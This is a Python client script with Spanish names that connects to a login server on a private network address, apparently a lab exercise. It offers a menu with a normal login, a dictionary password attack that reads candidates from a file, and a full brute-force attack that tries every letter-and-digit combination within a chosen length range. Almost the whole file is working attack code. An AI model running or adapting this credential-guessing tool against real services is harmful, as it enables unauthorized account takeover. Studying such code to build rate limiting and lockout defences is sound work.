import socket
import itertools
import string

def cargar_diccionario(ruta):
    with open(ruta, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f]

def login(client_socket, usuario, password):
    mensaje = f"2,{usuario},{password}"
    client_socket.sendall(mensaje.encode())
    respuesta = client_socket.recv(1024).decode()
    return "inicio de sesión exitoso" in respuesta.lower()


def ataque_diccionario(client_socket, usuario, diccionario):
    for password in diccionario:
        mensaje = f"2,{usuario},{password}"
        client_socket.sendall(mensaje.encode())
        respuesta = client_socket.recv(1024).decode()
        if "inicio de sesión exitoso" in respuesta.lower():
            print(f"Contraseña encontrada para {usuario}: {password}")
            return password
        else:
            print(f"Probando contraseña: {password} -> fallo")
    print("No se encontró la contraseña en el diccionario.")
    return None

def ataque_fuerza_bruta(client_socket, usuario, longitud_min, longitud_max, caracteres=None):
    if caracteres is None:
        caracteres = string.ascii_letters + string.digits
    print(f"Fuerza bruta total para usuario '{usuario}' desde longitud {longitud_min} a {longitud_max} iniciada...")
    for longitud in range(longitud_min, longitud_max + 1):
        for combinacion in itertools.product(caracteres, repeat=longitud):
            pwd = "".join(combinacion)
            if login(client_socket, usuario, pwd):
                print(f"Contraseña encontrada: {pwd}")
                return pwd
            else:
                print(f"Probada contraseña: {pwd} -> fallo")
    print("No se encontró la contraseña con fuerza bruta total.")
    return None

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('172.20.10.3', 8000))
    print("Conectado al servidor")

    diccionario = cargar_diccionario("diccionario.txt")

    while True:
        print("\nOpciones:")
        print("1. Login normal")
        print("2. Fuerza bruta con diccionario")
        print("3. Fuerza bruta total (combinaciones de caracteres)")
        print("4. Salir")
        opcion = input("Elige opción: ")

        if opcion == '1':
            usuario = input("Usuario: ")
            password = input("Contraseña: ")
            if login(client_socket, usuario, password):
                print("Inicio de sesión exitoso")
            else:
                print("Credenciales inválidas")
        elif opcion == '2':
            usuario = input("Usuario (fuerza bruta diccionario): ")
            ataque_diccionario(client_socket, usuario, diccionario)
        elif opcion == '3':
            usuario = input("Usuario (fuerza bruta total): ")
            longitud_min = int(input("Longitud mínima de la contraseña: "))
            longitud_max = int(input("Longitud máxima de la contraseña: "))
            ataque_fuerza_bruta(client_socket, usuario, longitud_min, longitud_max)
        elif opcion == '4':
            print("Cerrando cliente...")
            break
        else:
            print("Opción inválida")

    client_socket.close()

if __name__ == "__main__":
    main()
